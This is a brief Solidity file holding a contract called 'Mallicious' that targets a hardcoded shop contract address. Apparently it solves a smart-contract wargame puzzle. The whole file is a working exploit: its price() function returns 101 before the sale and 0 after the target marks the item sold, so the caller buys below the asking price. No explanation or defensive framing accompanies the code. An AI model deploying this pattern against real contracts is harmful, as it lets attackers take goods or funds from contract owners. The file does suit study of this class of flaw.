// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IShop {
  function isSold() external view returns (bool);
  function buy() external;
}

contract Mallicious {
	IShop target = IShop(0x59C040171572e3Df17909cd23b6c07a2455bB846);

	function buy() external {
		target.buy();
	}

	function price() external returns (uint256) {
		if (target.isSold()) { return 0; } 
		else { return 101; }
	}

}
